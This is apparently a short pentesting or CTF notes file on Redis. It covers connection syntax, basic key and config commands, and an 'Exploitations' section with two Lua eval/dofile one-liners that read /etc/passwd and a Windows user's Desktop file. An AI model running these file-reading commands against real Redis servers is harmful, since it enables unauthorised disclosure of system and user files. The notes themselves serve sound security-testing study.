# Redis
## Introduction to Redis
Key value pair database

(nil) mean does not exist

## Connecting
```bash
redis-cli -h $IP -p $port -a $password -n $databasenumber
```

## Concepts
```redis
info		# server info
```
Keyspace section provide the main dictionary of each database

## Useful Commands
```
select $database/$table
keys * # all keys
get $keyname

# CMD KEY
config get * # retrieve current configuration of the database
config get dir # windows directory command

get user	
set user


```

## Exploitations

```redis
eval dofile('/etc/passwd') 0 # enumerating files, with lua script dofile()
eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0 # enumerating files, with lua script dofile()
```